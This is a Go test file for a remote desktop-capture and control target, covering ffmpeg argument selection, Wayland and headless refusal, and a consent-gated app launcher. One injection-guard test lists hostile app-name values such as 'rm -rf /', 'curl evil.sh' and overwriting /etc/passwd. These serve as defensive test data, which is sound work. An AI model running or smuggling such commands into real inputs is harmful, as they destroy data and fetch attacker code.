package main

import (
	"context"
	"os"
	"runtime"
	"strings"
	"testing"
)

// TestDesktopScreenTargetDispatch pins the registration in runtimeTargetFor.
// A typo'd or dropped case arm is otherwise invisible until a client tries to
// create a session and gets "unknown remote runtime target".
func TestDesktopScreenTargetDispatch(t *testing.T) {
	tgt, err := runtimeTargetFor(desktopScreenTargetID)
	if err != nil {
		t.Fatalf("runtimeTargetFor(%q): %v", desktopScreenTargetID, err)
	}
	if _, ok := tgt.(desktopScreenTarget); !ok {
		t.Fatalf("expected desktopScreenTarget, got %T", tgt)
	}
}

// TestDesktopGrabArgsPerOS asserts the ffmpeg input flags for the host we are
// actually running on. Cross-OS branches can't be exercised here (they read
// host env), so this checks the live one and that fps is threaded through.
func TestDesktopGrabArgsPerOS(t *testing.T) {
	if runtime.GOOS == "linux" {
		// The linux branch is env-dependent; covered by the dedicated tests
		// below rather than here.
		t.Skip("linux branch covered by TestDesktopGrabArgsLinux*")
	}
	args, err := desktopGrabArgs(15, 0)
	if err != nil {
		t.Fatalf("desktopGrabArgs: %v", err)
	}
	joined := strings.Join(args, " ")
	var wantFmt string
	switch runtime.GOOS {
	case "darwin":
		wantFmt = "avfoundation"
	case "windows":
		wantFmt = "gdigrab"
	default:
		t.Skipf("no expectation wired for %s", runtime.GOOS)
	}
	if !strings.Contains(joined, wantFmt) {
		t.Errorf("expected %s backend on %s, got: %s", wantFmt, runtime.GOOS, joined)
	}
	if !strings.Contains(joined, "-framerate 15") {
		t.Errorf("fps not threaded into args: %s", joined)
	}
}

// TestDesktopGrabArgsLinuxWaylandRefused is the regression guard for the
// silent-blank-desktop failure: under Wayland, x11grab succeeds against the
// XWayland root and streams a screen containing no native-Wayland windows.
// Failing loudly is the whole point.
func TestDesktopGrabArgsLinuxWaylandRefused(t *testing.T) {
	if runtime.GOOS != "linux" {
		t.Skip("linux-only")
	}
	t.Setenv("WAYLAND_DISPLAY", "wayland-0")
	t.Setenv("DISPLAY", ":0")
	if _, err := desktopGrabArgs(12, 0); err == nil {
		t.Fatal("expected Wayland to be refused, got nil error")
	} else if !strings.Contains(err.Error(), "Wayland") {
		t.Errorf("expected a Wayland-specific error, got: %v", err)
	}
}

// TestDesktopGrabArgsLinuxHeadlessRefused: a box with no DISPLAY has no
// desktop to stream, and should say so rather than spawn a doomed ffmpeg.
func TestDesktopGrabArgsLinuxHeadlessRefused(t *testing.T) {
	if runtime.GOOS != "linux" {
		t.Skip("linux-only")
	}
	os.Unsetenv("WAYLAND_DISPLAY")
	t.Setenv("DISPLAY", "")
	if _, err := desktopGrabArgs(12, 0); err == nil {
		t.Fatal("expected headless linux to be refused, got nil error")
	}
}

// TestDesktopGrabArgsUnsupportedDisplay: ghost enumerates only the primary
// display on every OS, so a non-zero index must be rejected at Attach with a
// clear message instead of failing deep inside Capture.
func TestDesktopScreenAttachRejectsSecondaryDisplay(t *testing.T) {
	tgt := desktopScreenTarget{display: 1}
	if _, err := tgt.Attach(context.Background()); err == nil {
		t.Fatal("expected display 1 to be rejected, got nil error")
	} else if !strings.Contains(err.Error(), "primary display") {
		t.Errorf("expected a primary-display error, got: %v", err)
	}
}

// TestLaunchDesktopAppRejectsInjection is the security guard: `name` arrives
// over the session command channel, and must never be able to grow into a
// command even though every launcher is exec'd directly without a shell.
func TestLaunchDesktopAppRejectsInjection(t *testing.T) {
	for _, bad := range []string{
		"Safari; rm -rf /",
		"Safari && curl evil.sh",
		"Safari | tee /tmp/x",
		"Safari$(whoami)",
		"Safari`id`",
		"Safari\nrm -rf /",
		"Safari > /etc/passwd",
	} {
		if err := launchDesktopApp(context.Background(), bad); err == nil {
			t.Errorf("expected %q to be rejected", bad)
		} else if !strings.Contains(err.Error(), "illegal characters") {
			// An empty/consent error would also block it, but for the wrong
			// reason — assert the metacharacter guard specifically fired.
			t.Errorf("expected an illegal-characters error for %q, got: %v", bad, err)
		}
	}
}

func TestLaunchDesktopAppRejectsEmpty(t *testing.T) {
	if err := launchDesktopApp(context.Background(), "   "); err == nil {
		t.Fatal("expected empty app name to be rejected")
	}
}

// TestDesktopKeyParsing checks chord splitting without touching real input:
// an empty/whitespace chord must error rather than reaching KeyCombo with an
// empty slice.
func TestDesktopKeyParsingRejectsEmptyChord(t *testing.T) {
	tgt := desktopScreenTarget{}
	err := tgt.Key(context.Background(), "", "  +  + ")
	if err == nil {
		t.Fatal("expected empty chord to be rejected")
	}
	// On a host where control is disabled by policy (the default:
	// ControlEnabled=false) the consent gate fires first. Either error is a
	// correct refusal; what must never happen is a nil error.
	if !strings.Contains(err.Error(), "empty key") &&
		!strings.Contains(strings.ToLower(err.Error()), "control") {
		t.Errorf("unexpected error kind: %v", err)
	}
}

// TestProbeDesktopScreenTargetShape asserts the probe always returns a
// renderable row — the n2n picker shows disabled targets with a reason, so an
// unavailable host must still produce ID/Label and a non-empty Reason.
func TestProbeDesktopScreenTargetShape(t *testing.T) {
	got := probeDesktopScreenTarget()
	if got.ID != desktopScreenTargetID {
		t.Errorf("ID = %q, want %q", got.ID, desktopScreenTargetID)
	}
	if got.Label == "" {
		t.Error("Label must be set so the picker can render a row")
	}
	if !got.Enabled && strings.TrimSpace(got.Reason) == "" {
		t.Error("a disabled target must explain why")
	}
	if got.Surface != "desktop" {
		t.Errorf("Surface = %q, want %q", got.Surface, "desktop")
	}
}
